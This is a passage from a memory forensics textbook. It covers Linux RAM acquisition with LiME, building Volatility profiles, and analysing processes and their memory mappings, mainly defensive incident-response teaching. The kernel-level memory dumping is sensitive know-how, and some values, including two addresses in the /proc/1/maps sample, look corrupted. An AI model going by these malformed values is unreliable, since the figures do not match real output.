LiME operates by loading a kernel driver, but instead of creating a character device that userland can access, all acquisition is done within the kernel. This significantly enhances the accuracy of the resulting sample because there are no context switches between userland and the kernel required to transfer data. LiME also improves upon `fmem` by automatically determining the address ranges that contain main memory. To enumerate the ranges, LiME walks the kernel’s `iomem_resource` linked list. This list holds the descriptors for each physical memory segment. If the name of the segment matches that of RAM (`System RAM`), the corresponding `start` and `end` members determine where in physical memory the segment resides.

When acquiring memory with LiME, you can choose between multiple acquisition formats. When the recommended `lime` format is used, a structured file is produced that removes the need to create a zero-padded file. This structured format contains metadata that describes from which physical offset each section came, which allows the memory analysis tool to dynamically reconstruct the original memory layout.

Each segment of acquired memory starts with a `lime_header`. The following output shows this metadata structure:

```
>>> dt("lime_header")
'lime_header' (32 bytes)
0x0   : magic                          ['unsigned int']
0x4   : version                        ['unsigned int']
0x8   : start                          ['unsigned long long']
0x10  : end                            ['unsigned long long']
0x18  : reversed                       [‘unsigned long long']
```

The header contains a `magic` member whose value is `0x4C694D45` (LiME in hexadecimal). The `start` and `end` members tell you which addresses in physical memory correspond to the segment. The actual data immediately follows `lime_header`. To find the next segment and its `lime_header`, you simply add the size of the header plus the size of the segment. In Volatility, this logic is implemented within the LiME address space in `volatility/plugins/addrspaces/lime.py`.

#### Compiling LiME

To use LiME, you must first compile the kernel module for the kernel version you want to analyze. This is covered in detail in the project’s documentation ([https://code.google.com/p/lime-forensics/downloads/list](https://code.google.com/p/lime-forensics/downloads/list)). After you have compiled the module, you will have a file named `lime-<kernel version>.ko` that you can load on the target system (see the next step).

---

**WARNING**

Unless absolutely necessary, you should never compile LiME (or any software, for that matter) on a system that you plan to investigate. Compilation requires the installation of source code and other supporting files, not to mention that it creates a number of temporary files during the build process that might overwrite evidence in slack space. In some instances, the target machine may not even have a compiler installed. Thus, we strongly recommend compiling your tools on a system that is not part of the investigation and then executing only the compiled file(s) on the target machine.

Ideally, you would have access to test systems running the same kernel versions as your production ones. Leverage those machines to compile the LiME module. If you don’t have similarly configured systems, you can cross-compile modules (for more information, see the “Enterprise Linux Memory Forensics” section later in the chapter).

---

#### Loading LiME and Dumping Memory

LiME has the capability to dump memory to either the local disk or over the network, and it can do so in the following formats:

- **raw**: All memory ranges concatenated together
- **padded**: Similar to the raw format, except that gaps between memory ranges are padded with zeroes
- **lime**: Writes to the aforementioned LiME format (recommended)

You can control the destination of the memory dump by setting the `path` parameter to the kernel module. To dump the contents of memory to a file on a storage device, just specify `path=/path/to/memdmp.lime`. In this case, memory is acquired and written to your desired location as soon as the module is loaded. An example of acquiring memory to disk in the `lime` format is shown in the following command:

```
$ sudo insmod lime.ko "path=/mnt/externaldrive/memdmp.lime format=lime"
```

Note that in this command, we specify the path as `/mnt/external` in order to dump memory to an external drive. You should never, unless absolutely necessary, save evidence to the local disk because it would overwrite unallocated disk space that may be helpful during disk forensics.

For network-based acquisition, the path is given as `path=tcp:4444` (the actual port is up to you). A listening socket is then created on the target system and specified port. You can connect to the socket with a tool such as `netcat`, and acquisition will begin as soon as the connection is established. An example of acquiring memory over the network with `netcat` follows. The first command is run on the machine from which you want to acquire memory:

```
$ sudo insmod lime.ko "path=tcp:4444 format=lime"
```

Then on your forensics station, you can use `netcat` to acquire (assuming that 192.168.1.40 is the IP address of the target computer in which LiME is installed):

```
$ nc 192.168.1.40 4444 > memdmp.lime
```

---

**NOTE**

On some distributions, such as Ubuntu, the quotes around the parameters are required for correct operation. Other distributions, such as Red Hat, do not operate correctly if quotes are used.

---

### /proc/kcore

The `/proc/kcore` file exports the kernel’s virtual address space to userland in the form of a core dump (ELF) file. On 32-bit systems, this limits acquisition to the first 896MB of memory as explained in the `/dev/mem` discussion. On 64-bit systems, the usability of `/proc/kcore` changes as the kernel keeps a static virtual map of all RAM. This mapping is documented by the kernel developers in the `Documentation/x86/x86_64/mm.txt` file of the kernel source code. By reading from this static map, you can successfully acquire physical memory from 64-bit systems through `/proc/kcore`.

Unfortunately, the steps to acquire memory from `/proc/kcore` are tedious, and often require a specialized tool. A proof-of-concept- tool that can acquire memory from `/proc/kcore` accompanies the Volatility 2.4 release. The tool works by parsing the ELF sections of `/proc/kcore` and determining the segments that map memory through comparison with data read from `/proc/iomem`. Each acquired region is then written as a `LiME` segment in order to be immediately compatible with Volatility.

Even on 64-bit systems, `/proc/kcore` has a few disadvantages that may necessitate the use of the actual `LiME` tool for acquisition. The first issue is that `/proc/kcore` can be disabled. Nearly all stock distributions enable `/proc/kcore`, but security conscience systems such as grsecurity and the hardened Gentoo distribution disable it. The other disadvantage is that malware can hook the read function of `/proc/kcore` and filter out data received by the userland tool.

## Volatility Linux Profiles

Before you can use Volatility to analyze your newly acquired memory sample, you must first create a profile for the target operating system. If you have performed analyses on Windows samples before, you know that Volatility has built-in support for all the major Windows versions, and that no extra steps are required. However, Linux is different due to the large number of kernel versions, subkernel versions, and customized kernels. For example, at the time of this writing, Volatility supports kernel versions 2.6.11 through 3.14 (the latest). There are over 40 base kernels and 500 sub-versions in this range, each requiring a separate profile. Additionally, when a user compiles a kernel from scratch, each configuration option (enabled or disabled) can drastically change the resulting kernel.

This large number of kernel versions makes it impossible for Volatility to ship with profiles for all possible builds of the Linux kernel. Instead, the current approach is to build profiles for the most commonly seen kernels and educate users on how to create their own profiles for their own systems. In the future, we hope to have a more automated system for building a wide range of profiles that users can download.

---

**NOTE**

Hal Pomeranz released a tool (`https://github.com/halpomeranz/lmg`) that automates the compilation of both Volatility profiles and LiME modules when you execute from a system running the target kernel. This tool can greatly speed up analysis and ease the learning curve for new investigators.

---

### Software Setup

The software required to create Linux profiles is identified in the following listing:

- **dwarfdump**: A tool that parses the debugging information from ELF files, such as the Linux kernel and kernel modules. Specifically, the `dwarfdump` output includes the structure definitions. You can install this tool by fetching the `dwarfdump` package on Ubuntu/Debian, using the `libdwarf-tools` package on OpenSuSE and Fedora, or compiling it from source code ([http://reality.sgiweb.org/davea/dwarf.html](http://reality.sgiweb.org/davea/dwarf.html)).
- **Compiler tools**: You must install the tools required to compile C source code, such as `gcc` and `make`, on your computer. On Ubuntu and Debian distributions, you can simply use `apt-get install build-essential`, but this will vary between distributions.
- **Kernel headers**: You must retrieve the kernel headers of the exact kernel you want to analyze in order to create the correct structure definitions. Ubuntu/Debian headers are packaged in the `linux-headers-`uname -r`` package. For other distributions, simply search for their notion of kernel headers within the repository.

### Creating a Profile

Creating a profile consists of generating a set of VTypes (structure definitions) and a `System.map` file for a particular kernel version. Volatility leverages these sources of information to perform its analysis.

#### Creating VTypes

The current method to create VTypes is to compile `tools/linux/module.c` (distributed with Volatility) against the kernel that you want to analyze. `module.c` is a kernel module that declares members of all the types that Volatility needs. These declarations are enough to add the type definitions into the module’s debugging information. To compile the module, simply change into the `tools/linux` directory and type `make`. If successful, your output should look similar to this:

```
$ make
make -C //lib/modules/3.2.0-4-686-pae/build 
  CONFIG_DEBUG_INFO=y M=/opt/vol2.4/tools/linux modules
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /opt/vol2.4/tools/linux/module.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /opt/vol2.4/tools/linux/module.mod.o
  LD [M]  /opt/vol2.4/tools/linux/module.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'
dwarfdump -di module.ko > module.dwarf
make -C //lib/modules/3.2.0-4-686-pae/build M=/opt/vol2.4/tools/linux clean
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae'
  CLEAN  /opt/vol2.4/tools/linux/.tmp_versions
  CLEAN  /opt/vol2.4/tools/linux/Module.symvers
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'
```

Note that near the end of the compilation, `dwarfdump` runs against `module.ko` (the kernel module) to produce `module.dwarf`. You include this file within the profile zip.

---

**NOTE**

Building the `module.ko` is not necessary if you can use the compiled Linux kernel file (`vmlinux`) instead. However, the `vmlinux` file is not supplied with most Linux distributions.

---

#### Getting Symbols

Symbols are contained within the `System.map` file. You find this file in a number of places, including the install package for your distribution’s kernel, the `/boot` directory of the machine where the kernel is installed, or the source code directory in which the kernel was compiled. If you have the kernel ELF file (`vmlinux`), you can also generate a `System.map` file by running the `nm` command against it.

Most people simply copy the file from `/boot`, but be careful because systems with multiple kernels have multiple `System.map` files. In such cases, you can verify the filename first with `uname -a`, or on most distributions you can copy `/boot/System.map-`uname -r`` in order to ensure that you select the correct file. The `r` flag to `uname` tells it to print only the kernel release.

---

**NOTE**

The `System.map` file contains the addresses of all symbols from the kernel, which Volatility uses to locate key data structures in memory. Even a simple recompile of the same kernel is enough to change the addresses of symbols. These modifications are a major reason why you cannot take a profile you built for Ubuntu 11.04 and expect it to work on Ubuntu 12.04. You also cannot expect to run `apt-get upgrade` and have your previously functioning profile work with the newly updated kernel.

---

#### Making the Profile

To create the profile, place the `module.dwarf` and `System.map` files into a zip file. Then move this zip file into the `volatility/plugins/overlays/linux/` directory. You should name the zip file according to the distribution, architecture, and kernel version that it represents. You can take care of all these steps with a single command, as shown here:

```
$ zip /path/to/volatility/plugins/overlays/linux/Redhat2.6.11.zip 
      /path/to/module.dwarf 
      /path/to/System.map
```

---

**NOTE**

You can also create a separate directory outside of Volatility to store your profiles. When running Volatility, you must then prepend your command-line arguments with `--plugins=/path/to/your/profile/directory`. This can be useful if you are using the standalone Windows executable to analyze Linux memory dumps—in which case you don’t have a source installation of Volatility.

---

### Using the Profile

To use the profile, you must first find the name that Volatility assigns to it. The name will be “Linux” + your zip file name + “x86,” “x64,” or “ARM,” depending on the architecture. However, in case you forget, you can look up the name by running the `--info` command and searching for “Linux”:

```
$ python vol.py --info | grep Linux
Volatility Foundation Volatility Framework 2.4
LinuxCentOS63x64                 - A Profile for Linux CentOS63 x64
LinuxCentOS53x64                 - A Profile for Linux CentOS5.3 x64
LinuxFedora17x64                 - A Profile for Linux Fedora17 x64
LinuxNovellSuSE111x64            - A Profile for Linux NovellSuSE111 x64
LinuxOpenSuSE12x86               - A Profile for Linux OpenSuSE12 x86
LinuxUbuntu1204x64               - A Profile for Linux Ubuntu1204 x64
```

In this example, you see that a number of Linux profiles are installed, and this is a good example of why a consistent naming convention of your zip files is important. To use the given profile, simply pass its name as the `--profile` parameter:

```
$ python vol.py --profile=LinuxFedora17x64 -f /path/to/memory/sample linux_pslist
```

### Enterprise Linux Memory Forensics

Although creating profiles for one or two operating system versions is not overly difficult or burdensome, Linux systems administrators are often tasked with supporting multiple operating systems and kernel versions across the enterprise. Similarly, incident response teams often walk into environments with little or no preexisting knowledge of the operating system(s) in use.

To help in these situations, Volatility contains a separate `Makefile` (`Makefile.enterprise`) that allows you to cross compile (that is, compile against an arbitrary set of kernel headers instead of those of the current system). To use this `Makefile`, you must first edit the second line (`KDIR`) to point to your kernel headers directory. Then, instead of typing `make` from the `tools/linux` directory, type `make -f Makefile.enterprise`. This command compiles the kernel module against your custom headers.

#### Caveats to Cross Compiling

One complication you may encounter during the cross compilation process is that the kernel headers package from the distribution does not have the `.config` file needed to compile the Volatility debug module (`module.c`). In this case, you must also download the kernel image package. You then copy the file named `config-<kernel version>` to `.config` under the kernel headers directory. You also need to retrieve the `System.map` file for the kernel you want to compile against. This file is contained in the same kernel image package where the `.config` file is located.

#### Cross Compiling for Ubuntu

To compile a profile for Ubuntu’s 2.6.32-22-generic x86 kernel, you need the `linux-image-2.6.32-22-generic`, `linux-headers-2.6.32-22`, and `linux-headers-2.6.32-22-generic` packages. They are found on Ubuntu’s package search website: [http://packages.ubuntu.com](http://packages.ubuntu.com). Once you have the `linux-image` package, extract the `.deb` file with `ar` and then extract the data from the tar archive, as shown in the following commands:

```
$ wget http://security.ubuntu.com/ubuntu/pool/main/l/\
linux/linux-image-2.6.32-22-generic_2.6.32-22.36_i386.deb
[snip]
2013-11-23 11:54:51 - `linux-image-2.6.32-22-generic_2.6.32-22.36_i386.deb' 
$ ar x linux-image-2.6.32-22-generic_2.6.32-22.36_i386.deb
$ tar -xjf data.tar.bz2
$ ls
boot  data.tar.bz2  lib  usr
$ ls boot
abi-2.6.32-22-generic  config-2.6.32-22-generic  System.map-2.6.32-22-generic  
vmcoreinfo-2.6.32-22-generic  vmlinuz-2.6.32-22-generic
```

As you can see in the extracted data files, you have directories named `boot`, `lib`, and `usr`. If you list the contents of the `boot` directory, you find the `System.map` and `.config` file for the particular kernel version. In this example, the `.config` file is named `config-2.6.32-22-generic.`

Next, you have to download two packages for the kernel headers because Ubuntu makes a generic package for each kernel version plus specific packages for each version used by the operating system. You can start by downloading the base package:

```
$ wget http://security.ubuntu.com/ubuntu/pool/main/\
l/linux/linux-headers-2.6.32-22_2.6.32-22.36_all.deb
[snip]
2013-11-23 12:27:28 - `linux-headers-2.6.32-22_2.6.32-22.36_all.deb' 
$ ar x linux-headers-2.6.32-22_2.6.32-22.36_all.deb
$ tar -xzf data.tar.gz
$ ls usr/src/linux-headers-2.6.32-22
arch   crypto         drivers   fs
[snip]
```

Next you download the package for your specific kernel version:

```
$ wget http://security.ubuntu.com/ubuntu/pool/main/\
l/linux/linux-headers-2.6.32-22-generic_2.6.32-22.36_i386.deb
[snip]
2013-10-23 11:53:38 - `linux-headers-2.6.32-22-generic_2.6.32-22.36_i386.deb' 
$ ar x linux-headers-2.6.32-22-generic_2.6.32-22.36_i386.deb
$ ls
control.tar.gz  data.tar.gz  debian-binary  
linux-headers-2.6.32-22-generic_2.6.32-22.36_i386.deb
$ tar -xzf data.tar.gz
$ ls
lib  usr
$ ls usr/src/linux-headers-2.6.32-22-generic/
arch   crypto drivers   fs
[snip]
```

At this point, you must create a directory and put both of the header folders under it:

```
$ mkdir headers
$ cd headers
$ mv /path/to/usr/src/linux-headers-2.6.32-22-generic/ .
$ mv /path/to/usr/src/linux-headers-2.6.32-22 .
$ ls
linux-headers-2.6.32-22  linux-headers-2.6.32-22-generic
```

Next, copy the `.config` file from the `linux-image` package under `linux-headers-2.6.32-22-generic` (the directory for your specific kernel) to the directory that was just created (headers). Finally, update your Makefile’s `KDIR` option to specify this directory. After running the `make` command, you will have the `module.dwarf` file that you can place into a zip file with the `System.map` file from the `linux-image` package. Now you have an Ubuntu profile that you created without having to install or use a computer running the specific kernel version.

## Summary

Historically, the Linux operating system has provided several interfaces into physical memory *and* the kernel virtual address space. However, none of the options are suitable for forensic acquisition of main memory in a safe and complete manner. LiME, on the other hand, is specifically designed to address the issues that other tools presented in the past. With the ability to cross compile, you can create and deploy LiME modules throughout heterogeneous enterprise environments. Using similar tactics, you can also build the appropriate Volatility profiles for the target systems.
# Chapter 20 Linux Operating System

The Linux support in Volatility was first officially included with the 2.2 release (October 2012). Unless otherwise specified, Volatility’s Linux plugins support kernel versions 2.6.11 through 3.14. The ability to support deep analysis across such a wide range of kernels is dependent on a thorough understanding of the design decisions made by the Linux kernel developers and the technologies they use throughout the operating system. In this chapter, you learn about the Executable and Linking Format (ELF) file and how to locate specific sections in memory for analysis. You’ll also examine the global offset table (GOT), which adversaries can use to alter system behaviors. Finally, we describe an interesting aspect of Linux virtual address translation and a groundbreaking new technology that involves compressing swapped pages.

## ELF Files

ELF is the main executable file format used on Linux systems. User applications, shared libraries, kernel modules, and the kernel itself are all stored in the ELF format. To fully understand how you can perform memory forensics and malware analysis of Linux systems, you must first become familiar with the ELF format. To explore the ELF format, we will discuss its data structures and on-disk layout with the help of the `readelf` command. `readelf` is distributed with `binutils` and should be installed by default on all Linux distributions. Complete documentation of the ELF format can be found at [http://www.skyfree.org/linux/references/ELF_Format.pdf ...](http://www.skyfree.org/linux/references/ELF_Format.pdf)
# Chapter 21  
 Processes and Process Memory

A critical component of memory forensics of any system involves enumerating running processes, and exploring their interactions with the file system, memory, and network. Thus, this chapter focuses on the Linux kernel’s process structures and how they associate a process with its resources. The chapter also discusses how you can combine these resources with memory resident bash history to provide deep insight into the actions performed on the system. Additionally, the plugins highlighted in this chapter will provide the critical foundation for building the advanced capabilities discussed in later chapters.

## Processes in Memory

Every Linux process is represented by a `task_struct` structure in kernel memory. This structure holds all the information necessary to link a process with its opened file descriptors, memory maps, authentication credentials, and more. Instances of the structures are allocated from the kernel memory cache (`kmem_cache`) and stored within a cache named `task_struct_cachep`, which is also the name of a global variable in the Linux kernel that you can use to find the cache on systems that use the `SLAB` allocator (more information on this is coming up).

---

**NOTE**

The memory sample used in this chapter is from a 64-bit, 3.2 kernel installed on Debian Wheezy. This same memory sample is also used in the following chapters.

---

---

## **Analysis Objectives**

Your objectives are these:

- **Identify processes and their children**: Deep analysis of system activity necessitates finding all running processes and associating them with their parent and child processes. A bash shell isn’t suspicious *per se*, but it may become suspicious when you find out it was started by a browser process.
- **Distinguish processes from kernel threads**: Kernel threads are represented with the same data structure as processes. You must learn how to distinguish the two because malware often disguises itself as a kernel thread.
- **Associate processes to users and groups**: A full understanding of the extent of a breach or malware infection requires determining the level of privilege gained.

## **Data Structures**

The following output shows select members of the `task_struct` structure:

```
>>> dt("task_struct")
'task_struct' (1776 bytes)
0x0   : state                          ['long']
0x8   : stack                          ['pointer', ['void']]
0x10  : usage                          ['__unnamed_0x38e']
0x14  : flags                          ['unsigned int']
0x18  : ptrace                         ['unsigned int']
0x20  : wake_entry                     ['llist_node']
[snip]
0x170 : tasks                          ['list_head']
0x180 : pushable_tasks                 ['plist_node']
0x1a8 : mm                             ['pointer', ['mm_struct']]
0x1b0 : active_mm                      ['pointer', ['mm_struct']]
[snip]
0x1e4 : pid                            ['int']
0x1e8 : tgid                           ['int']
0x1f0 : stack_canary                   ['unsigned long']
0x1f8 : real_parent                    ['pointer', ['task_struct']]
0x200 : parent                         ['pointer', ['task_struct']]
0x208 : children                       ['list_head']
0x218 : sibling                        ['list_head']
0x228 : group_leader                   ['pointer', ['task_struct']]
[snip]
0x350 : cpu_timers                     ['array', 3, ['list_head']]
0x380 : real_cred                      ['pointer', ['cred']]
0x388 : cred                           ['pointer', ['cred']]
0x390 : replacement_session_keyring    ['pointer', ['cred']]
0x398 : comm                           ['String', {'length': 16}]
[snip]
```

## **Key Points**

The key points are as follows:

- `tasks`: The process’ reference into the linked list of active processes.
- `mm`: Stores memory management data. In particular, the DTB value (physical offset of the process’ directory table base) can be found at `mm->pgd`. This value is used to read from the address space of the process. It also holds references to important portions of process address space such as the stack, heap, code, and data. For kernel threads, this value is NULL.
- `pid`: The process ID.
- `parent`: A reference to the process that spawned the current one. If a process’ parent exits, the child is inherited by `init`.
- `children`: Holds the list of processes spawned by the current one.
- `cred`: Stores the credential information for the process. On some kernel versions, it includes the user ID (UID) and group ID (GID), whereas on others the user and group values are direct members of `task_struct`.
- `comm`: The name of the process is a 16-byte character array that stores the name of the executable or kernel thread. For a kernel thread, if its name ends with a forward slash followed by a number, the number indicates the CPU where the thread is executed.
- `start_time`: The time the process was created.

---

## Enumerating Processes

As previously mentioned, `task_struct` structures are stored in the `kmem_cache`. However, the target system may use different back-end allocators (`SLAB` or `SLUB`), depending on the `CONFIG_SLAB` and `CONFIG_SLUB` kernel configuration options. These memory managers serve the same purpose as pool allocations on Windows (see Chapter 5) and the `SLAB` allocator of Mac OS X: to allocate and deallocate structures of the same size in an efficient manner from a much larger, preallocated block of kernel memory.

The allocator the operating system uses impacts how you find process structures in memory. The older implementation (`SLAB`) tracks allocations of all objects of a particular type; however, it has been phased out for Intel–based Linux installs. That means you will frequently encounter systems using `SLUB` in the future. Unlike `SLAB`, however, `SLUB` does not track allocations, which makes it unreliable for enumerating objects.

---

**NOTE**

Despite being disabled on Intel–based Linux installs, the `SLAB` allocator is still widely used on Android. If you are interested in the forensics usefulness of the `kmem_cache`, we suggest reading the following paper: [http://dfir.org/research/DFRWS-2010-kmem_cache.pdf](http://dfir.org/research/DFRWS-2010-kmem_cache.pdf).

---

Aside from the kernel caches, there are two main sources for extracting process information in memory: the active process list and the PID hash table.

### Active Process List

The kernel uses this list to maintain a set of active processes. Contrary to popular belief, this list is not actually exported to userland. Thus, most live response and system administration tools do not reference it to enumerate processes. Many rootkits in the past have manipulated this data structure, however, because early Linux memory forensics tools relied on the list to enumerate active processes. This led to a discrepancy because processes would be hiding from memory forensics, but not the active system.

The `linux_pslist` plugin enumerates processes by walking the active process list pointed to by the global `init_task` variable. The `init_task` variable is statically allocated within the kernel, initialized at boot, has a PID of 0, and has a name of `swapper`. Due to a developer design choice, it does not appear in process lists generated through the `ps` command or `/proc`.

If you study the output of `linux_pslist`, you will see a number of columns populated with information about each process:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_pslist
Volatility Foundation Volatility Framework 2.4
Offset             Name         Pid   Uid  Gid DTB        Start Time
------------------ ------------ ---   ---  --- ----       ----------
0xffff88003e253510 init         1     0    0   0x37088000 2013-10-31 07:08:24
0xffff88003e252e20 kthreadd     2     0    0   ---------- 2013-10-31 07:08:24 
0xffff88003e252730 ksoftirqd/0  3     0    0   ---------- 2013-10-31 07:08:24 
0xffff88003e283550 kworker/u:0  5     0    0   ---------- 2013-10-31 07:08:24 
[snip]
0xffff88003b3d71e0 apache2      2142  33   33  0x3ce3f000 2013-10-31 07:08:44 
0xffff88003b0d3060 apache2      2144  33   33  0x3ce05000 2013-10-31 07:08:44 
0xffff88003b3d6af0 atd          2238   0   0   0x3b048000 2013-10-31 07:08:44 
0xffff88003cfb3750 daemon       2276   0   0   0x36f9e000 2013-10-31 07:08:45 
[snip]
```

As shown in the example, kernel threads do not have a DTB because they use the kernel’s address space. That is why their DTB value is denoted as “---” in the plugin output.

#### Linking Processes to Users

Also, you can cross-reference the UIDs and GIDs with the contents from `/etc/passwd` and `/etc/group`, respectively, to determine the associated user and group names. For example, the `apache2` user has UID 33 (`www-data`) and GID 33 (`www-data`), as shown here:

```
$ grep 33 /etc/{passwd,group}
/etc/passwd:www-data:x:33:33:www-data:/var/www:/bin/sh
/etc/group:www-data:x:33:
```

#### Parent and Child Relationships

Volatility also provides the `linux_pstree` plugin to help visualize the parent/child relationships. Children are indented to the right:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_pstree
Volatility Foundation Volatility Framework 2.4
Name                 Pid             Uid
init                 1               0
.udevd               348             0
..udevd              466             0
..udevd              467             0
<snip>
.sshd                2358            0
..sshd               2745            0
...bash              2747            0
....insmod           8643            0
.postgres            2381            104
..postgres           2384            104
..postgres           2385            104
..postgres           2386            104
..postgres           2387            104
[kthreadd]           2               0
.[ksoftirqd/0]       3               0
.[kworker/u:0]       5               0
.[migration/0]       6               0
.[watchdog/0]        7               0
.[migration/1]       8               0
.[ksoftirqd/1]       10              0
.[watchdog/1]        12              0
```

There are several items of interest to notice in this output. First, `init`, PID 1, is the root of the process tree except for the kernel threads. This will always be true on a clean Linux system. You can also see that all the children of `kthreadd`, the kernel thread daemon, are kernel threads. Again, this should be the case on a clean system. As you will see later, many rootkits attempt to hide their associated processes by enclosing their names in brackets (for example, `[process_name]`) in an attempt to blend in as a kernel thread. Naming a process with brackets is a common Linux convention to indicate that a process is really a kernel thread. This annotation is used by the `ps` command and several system-monitoring tools, such as `top`. Fortunately, `linux_pstree` makes this malicious activity easy to spot.

### PID Hash Table

The per-process directories under `/proc` are populated from the global PID hash table. Because the `ps` command, and all other active process listing tools gather processes from `/proc`, rootkits that want to hide processes from the live system must either tamper with this data structure or perform control flow redirection within the `/proc` file system or its supporting system calls. You will learn how to detect control modification on Linux systems in chapters 25 and 26.

---

**NOTE**

Parsing the PID hash table varies greatly between Linux kernel versions. If you’re interested in seeing the algorithms, consult the commented source code that is stored in the `volatility/plugins/linux/pidhashtable.py` file of the Volatility source distribution.

---

## Process Address Space

As the runtime loader maps an executable and its shared libraries, stack, heap, and other regions into the process address space, it must create data structures within the kernel to track and maintain these allocations. For each mapping, the kernel must track its starting and ending address, permissions, backing file information, and the metadata used for caching and searching. In this section, you will learn about methods to recover this information from memory and how you might find them useful during an investigation.

---

## **Analysis Objectives**

Your objectives are these:

- **Process memory classification**: Learn how to locate and extract a process’ heap, stack, or executable code from a memory dump.
- **Command-line arguments**: Determine where to look to extract the full command line used to invoke a process.
- **Environment variables**: Find out where a process’ variables are stored and how to verify if environment variables have been modified.
- **Shared library injection**: Analyzing the full paths to shared libraries and process executables helps detect some code injection attacks.

## **Data Structures**

The `mm` member of `task_struct` is of type `mm_struct` and it tracks the memory regions of a process. The following output shows several of the most important members for memory forensics. This output is from the test Debian system introduced earlier.

```
>>> dt("mm_struct")
'mm_struct' (920 bytes)
0x0   : mmap                           ['pointer', ['vm_area_struct']]
0x8   : mm_rb                          ['rb_root']
0x10  : mmap_cache                     ['pointer', ['vm_area_struct']]
[snip]
0x48  : pgd                            ['pointer', ['__unnamed_0x906']]
0x50  : mm_users                       ['__unnamed_0x38e']
0x54  : mm_count                       ['__unnamed_0x38e']
0x58  : map_count                      ['int']
[snip]
0xe8  : start_code                     ['unsigned long']
0xf0  : end_code                       ['unsigned long']
0xf8  : start_data                     ['unsigned long']
0x100 : end_data                       ['unsigned long']
0x108 : start_brk                      ['unsigned long']
0x110 : brk                            ['unsigned long']
0x118 : start_stack                    ['unsigned long']
0x120 : arg_start                      ['unsigned long']
0x128 : arg_end                        ['unsigned long']
0x130 : env_start                      ['unsigned long']
0x138 : env_end                        ['unsigned long']
[snip]
0x358 : ioctx_lock                     ['spinlock']
0x360 : ioctx_list                     ['hlist_head']
0x368 : owner                          ['pointer', ['task_struct']]
0x370 : exe_file                       ['pointer', ['file']]
0x378 : num_exe_file_vmas              ['unsigned long']
[snip]
```

## **Key Points**

The key points are these:

- `mmap` and `mm_rb`: These members store the individual process memory mappings as a linked list and red-black tree, respectively.
- `pgd`: The address of the process’ DTB. This is the member that populates the DTB column of `linux_pslist` and enables access to the process’ address space.
- `owner`: A back pointer to the `task_struct` that owns this `mm_struct`. On the kernels in which this member is enabled and the `SLAB` allocator is in use, it can serve as an alternative source of process listings because `mm_struct` structures are tracked by the cache.
- start_code and `end_code`: Pointers to the beginning and end of the process’ executable code.
- `start_data` and `end_data`: Pointers to the beginning and end of the process’ data.
- `start_brk` and `brk`: Pointers to the beginning and end of the process’ heap.
- `start_stack`: A pointer to the beginning of the process’ stack. No pointer is kept to the end of the stack because it will fluctuate on every function call.
- `arg_start` and `arg_end`: Pointers to the beginning and end of the command-line arguments.
- `env_start` and `env_end`: Pointers to the beginning and end of the process’ environment variables.

---

### Enumerating Process Mappings

Two members of the `mm_struct` hold the set of a process’ mappings. The first, `mmap`, is a linked list of `vm_area_struct` structures (one structure for each mapping). The other is `mm_rb`, which stores the same `vm_area_struct` structures, but in a red-black tree, so that the kernel can quickly find mappings during page faults or when a new memory range needs to be allocated. The tree is sorted by the starting address of each region, which enables the kernel to quickly query the region associated with an address.

---

## **Data Structures**

The `vm_area_struct` structures hold all information needed to find the region in memory, determine if it maps a file or not, calculate its page permissions, and more. Here is an example of the structure for our Debian system:

```
>>> dt("vm_area_struct")
'vm_area_struct' (176 bytes)
0x0   : vm_mm             ['pointer', ['mm_struct']]
0x8   : vm_start          ['unsigned long']
0x10  : vm_end            ['unsigned long']
0x18  : vm_next           ['pointer', ['vm_area_struct']]
0x20  : vm_prev           ['pointer', ['vm_area_struct']]
0x28  : vm_page_prot      ['pgprot']
0x30  : vm_flags          ['LinuxPermissionFlags', 
                           {'bitmap': {'x': 2, 'r': 0, 'w': 1}}]
0x38  : vm_rb             ['rb_node']
0x50  : shared            ['__unnamed_0xa071']
0x70  : anon_vma_chain    ['list_head']
0x80  : anon_vma          ['pointer', ['anon_vma']]
0x88  : vm_ops            ['pointer', ['vm_operations_struct']]
0x90  : vm_pgoff          ['unsigned long']
0x98  : vm_file           ['pointer', ['file']]
0xa0  : vm_private_data   ['pointer', ['void']]
0xa8  : vm_policy         ['pointer', ['mempolicy']]
```

## **Key Points**

The key points are these:

- `vm_start` and `vm_end`: The starting and ending virtual address of the region within the process’ address space.
- `vm_next` and `vm_prev`: Forward and back pointers inside the list of `vm_area_struct`structures for a process.
- `vm_flags`: Indicates whether the region was mapped readable, writable, and/or executable.
- `vm_pgoff`: The offset into the file that the region maps.
- `vm_file`: A pointer to the `file` structure of the file the region maps (or NULL if it is a memory-backed region).

---

The operating system uses the list of mappings held in the `mmap` member to populate the /`proc/<pid>/maps` files on a live system. Displaying the memory mappings by reading the files can be helpful for debugging and other system administration tasks. For example, the following snippet is from the `init` process on the same Debian machine as the analyzed memory sample:

```
# cat /proc/1/maps
00400000-00409000 r-xp 00000000 08:01 1044487        
                           /sbin/init
00608000-00609000 rw-p 00008000 08:01 1044487      
                           /sbin/init
01dc1000-01dc20e000 rw-p 00000000 00:00 0                    
                          [heap]

[snip]

7c98f080b18000-7c98f080b1a000 r-xp 00000000 08:01 130572  
                           /lib/x86_64-linux-gnu/libdl-2.13.so
7c98f080b1a000-7c98f080d1a000 ---p 00002000 08:01 130572                     
                          /lib/x86_64-linux-gnu/libdl-2.13.so
7f9881726000-7f9881727000 rw-p 00020000 08:01 130582                     
                          /lib/x86_64-linux-gnu/ld-2.13.so
7f9881727000-7f9881728000 rw-p 00000000 00:00 0
7fff23e60000-7fff23e81000 rw-p 00000000 00:00 0 
                          [stack]
```

You can compare the output of that command with the results from Volatility’s `linux_proc_maps` plugin. This plugin walks the `task_struct->mm->mmap` list of each process and reports the region-specific data.

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_proc_maps -p 1
Volatility Foundation Volatility Framework 2.4
Pid Start              End                Flags  Pgoff Major Minor  Inode   Path
--  ------------------ ------------------ ------ ----- ----- ------ -----   ----
1   0x0000000000400000 0x0000000000409000 r-x    0x0     8   1      1044487 
/sbin/init
1   0x0000000000608000 0x0000000000609000 rw-    0x8000  8   1      1044487 
/sbin/init
